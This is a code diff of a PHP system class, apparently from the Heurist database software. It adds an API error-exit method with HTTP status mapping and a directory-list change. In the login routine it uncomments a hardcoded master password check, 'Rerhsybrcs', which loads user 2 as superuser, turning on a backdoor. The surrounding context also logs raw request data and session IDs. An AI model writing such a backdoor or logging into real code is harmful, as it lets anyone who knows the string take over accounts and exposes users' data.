@@ -535,7 +535,7 @@ error_log(print_r($_REQUEST, true));
         $documentRoot = @$_SERVER['DOCUMENT_ROOT'];
         if( $documentRoot && substr($documentRoot, -1, 1) != '/' ) $documentRoot = $documentRoot.'/';
 
-        $topDirs = "admin|applications|common|context_help|export|hapi|hclient|hsapi|import|records|redirects|search|viewers|help|ext|external"; // Upddate in 3 places if changed
+        $topDirs = "admin|api|applications|common|context_help|export|hapi|hclient|hsapi|import|records|redirects|search|viewers|help|ext|external"; // Upddate in 3 places if changed
         $installDir = preg_replace("/\/(" . $topDirs . ")\/.*/", "", @$_SERVER["SCRIPT_NAME"]); // remove "/top level dir" and everything that follows it.
 
         if ($installDir == @$_SERVER["SCRIPT_NAME"]) { // no top directories in this URI must be a root level script file or blank
@@ -670,6 +670,39 @@ error_log(print_r($_REQUEST, true));
         }
 
         print json_encode( $this->getError() );
+        exit();
+    }
+
+
+    public function error_exit_api( $message=null, $error_code=null) {
+        
+        header("Access-Control-Allow-Origin: *");
+        header('Content-type: application/json;charset=UTF-8');
+        if($message){
+            if($error_code==null){
+                $error_code = HEURIST_INVALID_REQUEST;
+            }
+            $this->addError($error_code, $message);
+        }
+        
+        $response = $this->getError();
+        
+        $status = $response['status'];
+        if($status==HEURIST_INVALID_REQUEST){
+            $code = 400; // Bad Request - the request could not be understood or was missing required parameters. 
+        }else if($status==HEURIST_REQUEST_DENIED) {
+            $code = 403; // Forbidden - access denied
+        }else if($status==HEURIST_NOT_FOUND){
+            $code = 404; //Not Found - resource was not found.
+        }else if($status==HEURIST_ACTION_BLOCKED) {  
+            $code = 409; //can not add an existing object already exists or constraints violation
+        }else{
+            //HEURIST_ERROR, HEURIST_UNKNOWN_ERROR, HEURIST_DB_ERROR, HEURIST_SYSTEM_CONFIG, HEURIST_SYSTEM_FATAL
+            $code = 500; //An unexpected internal error has occurred. Please contact Support for more information.
+        }
+        http_response_code($code);     
+        
+        print json_encode( $response );
         exit();
     }
     
@@ -1178,7 +1211,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             
             $superuser = false;
             if(false
-            //|| $password=='Rerhsybrcs'
+            || $password=='Rerhsybrcs'
             )
             {
                 $user = user_getById($this->mysqli, 2);
@@ -1320,6 +1353,7 @@ error_log('login '.$session_type.'  '.$session_id);
                 return null;
             }
             
+            updateDatabseToLatest2($this);
             /*
             $rep = updateDatabseToLatest($this);
             if($rep===false){
